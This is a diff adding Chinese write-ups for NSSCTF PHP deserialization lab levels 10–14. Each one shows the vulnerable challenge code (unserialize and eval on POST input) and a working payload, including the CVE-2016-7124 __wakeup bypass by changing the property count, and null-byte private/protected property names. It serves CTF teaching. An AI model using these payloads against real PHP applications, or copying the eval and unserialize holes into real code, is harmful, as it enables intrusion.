@@ -29,6 +29,8 @@ category: 网络安全
 
 在线靶场：[https://www.nssctf.cn/problem](https://www.nssctf.cn/problem) 在 `HelloCTF` 来源中搜索 `反序列化靶场`
 
+所有的魔术方法 [https://www.php.net/manual/zh/language.oop5.magic.php](https://www.php.net/manual/zh/language.oop5.magic.php)
+
 ## 题目列表
 
 - [[反序列化靶场]Level1-类的实例化](https://www.nssctf.cn/problem/6282)
@@ -40,6 +42,11 @@ category: 网络安全
 - [[反序列化靶场]Level7-实例化和反序列化](https://www.nssctf.cn/problem/6288)
 - [[反序列化靶场]Level8-GC机制](https://www.nssctf.cn/problem/6289)
 - [[反序列化靶场]Level9-构造函数的后门](https://www.nssctf.cn/problem/6290)
+- [[反序列化靶场]Level10-\_\_wakeup()](https://www.nssctf.cn/problem/6291)
+- [[反序列化靶场]Level11-CVE-2016-7124](https://www.nssctf.cn/problem/6292)
+- [[反序列化靶场]Level12-\_\_sleep()](https://www.nssctf.cn/problem/6294)
+- [[反序列化靶场]Level13-\_\_toString()](https://www.nssctf.cn/problem/6295)
+- [[反序列化靶场]Level14-\_\_invoke()](https://www.nssctf.cn/problem/6296)
 
 
 ## \[反序列化靶场\]Level1-类的实例化
@@ -580,6 +587,260 @@ POST传参即可
 ```
 NSSCTF{5b9f126f-4adf-456e-86bf-0675e9a76816}
 ```
+
+## \[反序列化靶场\]Level10-\_\_wakeup()
+
+```php
+class FLAG{  
+    function __wakeup() {  
+        include 'flag.php';  
+        echo $flag;  
+    }  
+}  
+  
+if(isset($_POST['o']))  
+{    
+	unserialize($_POST['o']);  
+}else {    
+	highlight_file(__FILE__);  
+}  
+
+```
+
+>\_\_wakeup()，执行unserialize()时，先会调用这个函数
+
+所以直接反序列化一个名为`FLAG`的空类即可
+
+Payload：
+```php
+class FLAG {
+}
+$a = new FLAG();
+echo serialize($a);
+//O:4:"FLAG":0:{}
+POST传参即可
+```
+
+得到Flag
+```
+NSSCTF{Default_Flag}
+```
+
+## \[反序列化靶场\]Level11-CVE-2016-7124
+
+```php
+error_reporting(0);  
+  
+include 'flag.php';  
+  
+class FLAG {  
+    public $flag = "FAKEFLAG";  
+  
+    public function  __wakeup(){  
+        global $flag;        
+        $flag = NULL;  
+    }  
+    public function __destruct(){  
+        global $flag;  
+        if ($flag !== NULL) {  
+            echo $flag;  
+        }else  
+        {  
+            echo "sorry,flag is gone!";  
+        }  
+    }  
+}  
+  
+if(isset($_POST['o']))  
+{    
+	unserialize($_POST['o']);  
+}else {    
+	highlight_file(__FILE__);    
+	phpinfo();  
+}  
+  
+?>
+```
+
+分析这个题目可知 只要在`$flag !== NULL`的条件下执行`__destruct`函数 便可以拿到flag
+
+且默认状态下 `$flag !== NULL` 条件成立 但是如果执行`__wakeup`函数 则会使条件不成立
+
+所以我们要绕过`__wakeup`函数 不让它执行 这就是我们这道题的主角[CVE-2016-7124](https://nvd.nist.gov/vuln/detail/CVE-2016-7124)
+
+这个CVE-2016-7124影响范围如下
+
+- PHP5 < 5.6.25  
+- PHP7 < 7.0.10
+
+如何利用呢？只需要修改最后你要绕过的类的成员数量 以这个题目举例
+
+```php
+class FLAG {
+    public $flag = "FAKEFLAG";
+}
+$a = new FLAG();
+echo serialize($a);
+//O:4:"FLAG":1:{s:4:"flag";s:8:"FAKEFLAG";}
+```
+这里得出的`O:4:"FLAG":1:{s:4:"flag";s:8:"FAKEFLAG";}` 成员数量为1 修改为其他数量即可
+
+Payload：
+```php
+O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}
+```
+
+得出Flag
+```
+NSSCTF{77b007ba-81cd-40f4-a355-849a51ec3877}
+```
+
+## \[反序列化靶场\]Level12-\_\_sleep()
+
+```php
+class FLAG {  
+  
+    private $f;  
+    private $l;  
+    protected $a;  
+    public  $g;  
+    public $x,$y,$z;  
+  
+    public function __sleep() {  
+        return ['x','y','z'];  
+    }  
+}  
+  
+class CHALLENGE extends FLAG {  
+  
+    public $h,$e,$l,$I,$o,$c,$t,$f;  
+  
+    function chance() {  
+        return $_GET['chance'];  
+    }  
+    public function __sleep() {        
+    /* FLAG is $h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g */        
+	    $array_list = ['h','e','l','I','o','c','t','f','f','l','a','g'];        
+	    $_=array_rand($array_list);$__=array_rand($array_list);  
+	    return array($array_list[$_],$array_list[$__],$this->chance());  
+    }  
+  
+}  
+  
+$FLAG = new FLAG();  
+echo serialize($FLAG);  
+  
+echo serialize(new CHALLENGE());
+
+//If you serialize FLAG, you will just get x,y,z  
+//O:4:"FLAG":3:{s:1:"x";N;s:1:"y";N;s:1:"z";N;}  
+//------ 每次请求会随机返回两个属性，你也可以用 chance 来指定你想要的属性 ------  
+//Now __sleep()'s return parameters is array('o','o','you shuold use it')  
+//O:9:"CHALLENGE":3:{s:1:"o";s:7:"called_";s:1:"o";s:7:"called_";s:17:"you shuold use it";N;}
+
+
+```
+
+
+这个题目主要是为了告诉你 当执行`serialize()`时，先会调用`__sleep()`函数
+
+在`CHALLENGE`这个类中 它继承了 `FLAG` 类 因此它拥有能够访问`FLAG`类里面的`f、l、a、g`变量
+
+这边给你提示说`/* FLAG is $h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g */ `
+
+里面提到了多次`f、a`变量  由于子类应该是对`f、a`变量进行再次的赋值 因此如果我们要获取完整正确的flag 我们需要在获取的时候 `f、l、a、g`变量都应该获取父类的变量
+
+还有一个知识点就是 在我们调用非`public`类型变量的时候 有着特殊的调用规则 
+
+
+|         | public | private                 | protected        |
+| ------- | ------ | ----------------------- | ---------------- |
+| payload | {name} | %00{classname}%00{name} | %00{\*}%00{name} |
+
+通过代码审计 我们知道 我们可以通过 get对`chance`参数传参 去获得对应的变量数据
+
+因此Payload：
+```
+GET传参 ?chance={value}
+value依次为 h、e、l、I、o、c、t、f、%00FLAG%00f、%00FLAG%00l、%00*%00a、g
+```
+得到flag的部分片段 然后进行拼接得到Flag
+```
+NSSCTF{Th3___sleep_function__is_called_before_serialization_t0_clean_up_4nd_select_variab1es}
+```
+
+## \[反序列化靶场\]Level13-\_\_toString()
+
+```php
+class FLAG {  
+    function __toString() {  
+        echo "I'm a string ~~~";  
+        include 'flag.php';  
+        return $flag;  
+    }  
+}  
+  
+$obj = new FLAG();  
+  
+if(isset($_POST['o'])) {  
+    eval($_POST['o']);  
+} else {
+    highlight_file(__FILE__);  
+}
+```
+
+魔法函数`__toString`指的是当此类当作字符串时 函数将会被调用 
+
+这边如果这个函数被调用 则会直接返回flag值 也就是说 把它当作字符串时 他就是flag
+
+所以我们这边直接执行输出
+
+Payload：
+```php
+POST传参 o=echo $obj;
+```
+
+得到Flag
+```
+NSSCTF{00119b97-2cfd-4b41-a8a9-2966fedf10a8}
+```
+
+## \[反序列化靶场\]Level14-\_\_invoke()
+
+```php
+class FLAG{  
+    function __invoke($x) {  
+        if ($x == 'get_flag') {  
+            include 'flag.php';  
+            echo $flag;  
+        }  
+    }  
+}  
+  
+$obj = new FLAG();  
+  
+if(isset($_POST['o'])) {  
+    eval($_POST['o']);  
+} else {
+    highlight_file(__FILE__);  
+}
+```
+
+这依旧是一个魔法函数 `__invoke` 它表示 当此类被当作函数调用时 将会调用此函数
+
+代码审计发现 当`__invoke` 被调用时的输入值为`get_flag`时 将直接输出flag值 
+
+于是Payload：
+```php
+POST传参 o=$obj(get_flag);
+```
+
+得到Flag
+```
+NSSCTF{96cc166d-3560-4da6-b2b9-be01d14d4d4a}
+```
+
+
 
 ---
 今天写累了 先写到这吧 明天再写下半部分
